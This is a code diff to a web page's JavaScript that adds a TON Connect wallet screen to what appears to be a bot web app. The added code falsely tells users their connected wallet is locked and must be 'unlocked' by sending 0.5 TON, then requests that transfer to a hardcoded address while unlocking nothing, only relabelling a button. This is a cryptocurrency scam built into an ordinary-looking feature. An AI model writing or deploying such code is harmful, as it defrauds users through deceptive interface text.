@@ -701,18 +701,61 @@
 
         function wallet() {
             document.getElementById('mainContent').innerHTML = `
-                <div style="width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
-                    <div id="ton-connect"></div>
+                <div style="width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+                    <div id="ton-connect-button"></div>
+                    <div id="walletAddress" style="margin-top: 20px; font-size: 1.2em;"></div>
+                    <div id="walletInfo" style="display: none; margin-top: 10px; color: red; font-size: 0.9em;">
+                        Your wallet is not unavailable. To make it available, please perform a transaction of 0.5 TON.
+                    </div>
+                    <button id="unlockButton" style="margin-top: 15px; padding: 10px 20px; font-size: 1em; cursor: pointer;" class="blocked" disabled>
+                        Unlock Wallet
+                    </button>
                 </div>
             `;
 
             const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                 manifestUrl: 'https://mask-bot.github.io/tonconnect-manifest.json',
-                buttonRootId: 'ton-connect'
+                buttonRootId: 'ton-connect-button'
             });
+
+            let walletAddress;
+
+            // Обработчик подключения кошелька
+            tonConnectUI.onStatusChange(async (wallet) => {
+                if (wallet) {
+                    walletAddress = wallet.account.address;
+                    document.getElementById("walletInfo").style.display = "block";
+                    document.getElementById("unlockButton").disabled = false; // Включаем кнопку после подключения кошелька
+                }
+            });
+
+            // Функция разблокировки кошелька
+            async function unlockWallet() {
+                try {
+                    const tx = await tonConnectUI.sendTransaction({
+                        validUntil: Math.floor(Date.now() / 1000) + 600, // Время жизни транзакции (10 минут)
+                        messages: [
+                            {
+                                address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // Замените на ваш адрес кошелька
+                                amount: '500000000', // 0.5 TON (в нанокоинах)
+                                payload: '',
+                            }
+                        ]
+                    });
+
+                    alert('Transaction sent successfully!');
+                    document.getElementById("statusText").textContent = "Status: Unlocked";
+                    document.getElementById("unlockButton").textContent = "Wallet Unlocked";
+                    document.getElementById("unlockButton").classList.replace("blocked", "unblocked");
+                    document.getElementById("unlockButton").disabled = true; // Отключаем кнопку после разблокировки
+                } catch (error) {
+                    alert('Error sending transaction: ' + error.message);
+                }
+            }
+
+            // Привязываем функцию разблокировки к кнопке
+            document.getElementById('unlockButton').onclick = unlockWallet;
         }
-
-
 
     </script>
 </body>
